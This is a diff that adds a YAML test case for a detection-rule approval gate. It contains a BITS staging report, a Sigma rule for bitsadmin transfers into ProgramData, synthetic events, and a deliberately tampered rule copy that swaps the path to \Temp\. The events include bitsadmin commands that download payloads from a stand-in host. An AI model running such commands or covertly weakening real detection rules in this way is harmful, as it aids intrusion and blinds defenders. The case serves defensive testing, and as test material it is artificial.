@@ -1,0 +1,129 @@
+id: D10-05
+role: defective
+defect_class: D10
+evasive: true
+why: The approved rule requires bitsadmin.exe /transfer with a destination under \ProgramData\, where
+  the report says the payload was written. The tampered copy swaps that path for \Temp\, a plausible-looking
+  change that makes the rule miss both positive events and alert on the benign patch-deployment look-alike,
+  and the SHA-256 differs from the approved content.
+expected_gate: approval-binding
+report_text: The loader on the engineering workstation was staged using BITS rather than a browser. The
+  command recorded was bitsadmin.exe /transfer job1 /download /priority high http://files-mirror.example/agent.bin
+  C:\ProgramData\agent.bin, executed from a command shell opened by the operator. Writing the payload
+  into ProgramData rather than a user profile directory let it survive profile clean-up and made it readable
+  by every account on the host. A follow-up scheduled task started the downloaded agent at the next logon.
+  The same /transfer pattern with a C:\ProgramData destination appeared on four hosts.
+evidence:
+- bitsadmin.exe /transfer job1 /download /priority high http://files-mirror.example/agent.bin C:\ProgramData\agent.bin
+- The same /transfer pattern with a C:\ProgramData destination appeared on four hosts
+logsource: windows_process_creation
+techniques:
+- T1197
+sigma_yaml: |
+  title: BITSAdmin Transfer to ProgramData
+  id: 07d9e3b5-a4c2-4816-9f0d-b6e1a73c5280
+  status: experimental
+  description: Detects bitsadmin.exe creating a transfer job that writes the downloaded file into the ProgramData directory.
+  references:
+    - urn:atidep:case
+  author: case-author
+  date: 2026/10/02
+  tags:
+    - attack.execution
+    - attack.persistence
+    - attack.stealth
+    - attack.t1197
+  logsource:
+    category: process_creation
+    product: windows
+  detection:
+    selection:
+      Image|endswith: '\bitsadmin.exe'
+      CommandLine|contains|all:
+        - '/transfer'
+        - '\ProgramData\'
+    condition: selection
+  falsepositives:
+    - Administrators deploying files into ProgramData with bitsadmin
+  level: medium
+assumptions: []
+events:
+  positive:
+  - kind: process_create
+    image: C:\Windows\System32\bitsadmin.exe
+    cmd: bitsadmin.exe /transfer job1 /download /priority high http://files-mirror.example/agent.bin C:\ProgramData\agent.bin
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\carol
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\bitsadmin.exe
+    cmd: bitsadmin /transfer upd2 /download http://files-mirror.example/cfg.dat C:\ProgramData\Microsoft\cfg.dat
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\carol
+    dest_ip: null
+    dest_port: null
+    name: null
+  negative:
+  - kind: process_create
+    image: C:\Windows\System32\PING.EXE
+    cmd: ping 192.0.2.1
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\whoami.exe
+    cmd: whoami /groups
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  lookalike:
+  - kind: process_create
+    image: C:\Windows\System32\bitsadmin.exe
+    cmd: bitsadmin.exe /transfer patchjob /download /priority normal http://updates.corp.example/patch.msu
+      C:\Windows\Temp\patch.msu
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\itadmin
+    dest_ip: null
+    dest_port: null
+    name: null
+tamper_sigma_yaml: |
+  title: BITSAdmin Transfer to ProgramData
+  id: 07d9e3b5-a4c2-4816-9f0d-b6e1a73c5280
+  status: experimental
+  description: Detects bitsadmin.exe creating a transfer job that writes the downloaded file into the ProgramData directory.
+  references:
+    - urn:atidep:case
+  author: case-author
+  date: 2026/10/02
+  tags:
+    - attack.execution
+    - attack.persistence
+    - attack.stealth
+    - attack.t1197
+  logsource:
+    category: process_creation
+    product: windows
+  detection:
+    selection:
+      Image|endswith: '\bitsadmin.exe'
+      CommandLine|contains|all:
+        - '/transfer'
+        - '\Temp\'
+    condition: selection
+  falsepositives:
+    - Administrators deploying files into ProgramData with bitsadmin
+  level: medium
+review: {}
+excluded: false
+exclusion_reason: ''
